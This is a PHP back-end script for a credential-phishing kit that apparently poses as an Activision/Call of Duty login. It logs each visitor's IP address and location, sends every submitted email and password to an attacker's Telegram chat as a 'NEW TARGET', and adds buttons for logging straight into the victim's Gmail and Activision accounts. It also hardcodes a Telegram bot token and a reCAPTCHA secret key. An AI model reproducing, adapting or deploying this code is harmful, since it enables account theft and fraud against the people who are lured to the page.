<?php
session_start();
// LOG VISIT TO SEND.PHP FOR DEBUG - این خط‌ها برای تست اضافه شدن
file_put_contents('send_visit_log.txt', "Send.php hit at " . date('Y-m-d H:i:s') . " | Method: " . $_SERVER['REQUEST_METHOD'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . " | POST Data: " . print_r($_POST, true) . "\n", FILE_APPEND);

function getUserIp() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // Use curl for ipinfo to avoid network issues
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ipinfo.io/{$ip}/json");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode == 200) {
        $ipDetails = json_decode($response);
        $country = $ipDetails->country ?? 'Unknown';
    } else {
        $country = 'Unknown';
    }
    return [$ip, $country];
}
function escapeMarkdownV2($text) {
    $text = str_replace(['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'],
                        ['\\\\', '\_', '\*', '\[', '\]', '\(', '\)', '\~', '\`', '\>', '\#', '\+', '\-', '\=', '\|', '\{', '\}', '\.', '\!'], $text);
    return $text;
}
function getAccountId($email) {
    $file = 'accounts.json';
    $accounts = [];
    if (file_exists($file)) {
        $accounts = json_decode(file_get_contents($file), true) ?: [];
    }
    if (isset($accounts[$email])) {
        return $accounts[$email];
    } else {
        $nextId = count($accounts) + 1;
        $accounts[$email] = "Account $nextId";
        file_put_contents($file, json_encode($accounts));
        return $accounts[$email];
    }
}
$botToken = '8356818555:AAFMC6VDrvxGYyTwG6e48Va97FoRspDXS8w'; // Renew this in BotFather if 401
$chatId = '-1003337812609';
$logoUrl = 'https://1000logos.net/wp-content/uploads/2020/09/Call-of-Duty-Logo-2011.png'; // Valid PNG (tested)
function sendToTelegram($token, $chatId, $text, $photoUrl = null, $keyboard = null) {
    if ($photoUrl) {
        $url = "https://api.telegram.org/bot$token/sendPhoto";
        $data = [
            'chat_id' => $chatId,
            'photo' => $photoUrl,
            'caption' => $text,
            'parse_mode' => 'MarkdownV2'
        ];
        if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    } else {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'MarkdownV2'
        ];
        if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    $log = "HTTP: $httpCode | Error: $error | Result: $result\n";
    file_put_contents('telegram_log.txt', $log, FILE_APPEND);
    return $result;
}
// Visit log
list($rawUserIp, $userCountry) = getUserIp();  // raw IP بدون escape
$userIp = escapeMarkdownV2($rawUserIp);  // حالا escape برای تلگرام
$userCountry = escapeMarkdownV2($userCountry);
$userAgent = escapeMarkdownV2($_SERVER['HTTP_USER_AGENT']);
$timestamp = date('Y-m-d H:i:s', strtotime('+4 hours'));
$visitText = "NEW VISIT\n\nIP: `$userIp`\nCountry: `$userCountry`\nUser Agent: `$userAgent`\nTimestamp: `$timestamp`\n\nCoded By 'kiya'";
$visitResult = sendToTelegram($botToken, $chatId, $visitText, $logoUrl);
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['username']) && !empty($_POST['password'])) {
    $username = escapeMarkdownV2($_POST['username']);
    $password = escapeMarkdownV2($_POST['password']);
    
    // BYPASS reCAPTCHA FOR TEST - بعد از fix secretkey، uncomment کن
    /*
    $recaptcha = $_POST['g-recaptcha-response'] ?? '';
    if (empty($recaptcha)) {
        echo json_encode(['success' => false, 'error' => 'Please complete the reCAPTCHA.']);
        exit();
    }
    $secretKey = '6LdoLxwsAAAAANG1GnB8O5XPBtBWrt_bBX92i7qM';  // secretkey درست v3 رو از Google Console بذار
    $recaptchaValidationUrl = "https://www.google.com/recaptcha/api/siteverify";
    // Use curl for reCAPTCHA v3 validation to fix network errors
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $recaptchaValidationUrl . '?secret=' . $secretKey . '&response=' . $recaptcha . '&remoteip=' . urlencode($rawUserIp));  // raw IP + urlencode
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $recaptchaResponse = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    // لاگ برای دیباگ (چک کن recaptcha_log.txt)
    file_put_contents('recaptcha_log.txt', "Response: $recaptchaResponse | HTTP: $httpCode | IP: $rawUserIp\n", FILE_APPEND);
    if ($httpCode != 200) {
        echo json_encode(['success' => false, 'error' => 'reCAPTCHA network error. Please try again.']);
        exit();
    }
    $recaptchaResult = json_decode($recaptchaResponse, true);
    // For v3: Check success AND score >= 0.5 (adjust threshold if needed)
    if (!$recaptchaResult['success'] || ($recaptchaResult['score'] ?? 0) < 0.5) {
        echo json_encode(['success' => false, 'error' => 'reCAPTCHA validation failed. Please try again.']);
        exit();
    }
    */
    
    $accountId = getAccountId($username);
    $_SESSION['username'] = $username;
    $caption = "NEW TARGET\n\nAccount ID: `$accountId`\nEmail: `$username`\nPassword: `$password`\n\nIP: `$userIp`\nCountry: `$userCountry`\nUser Agent: `$userAgent`\nTimestamp: `$timestamp`\n\nCoded By 'kiya'";
    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Login to Gmail', 'url' => 'https://mail.google.com'],
                ['text' => 'Login to Activision', 'url' => 'https://s.activision.com/activision/login']
            ]
        ]
    ];
    $credResult = sendToTelegram($botToken, $chatId, $caption, $logoUrl, $inlineKeyboard);
    if (strpos($credResult, '"ok":true') === false) {
        // Fallback to text only
        sendToTelegram($botToken, $chatId, $caption, null, $inlineKeyboard);
    }
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false, 'error' => 'Please fill in all required fields.']);
}
?>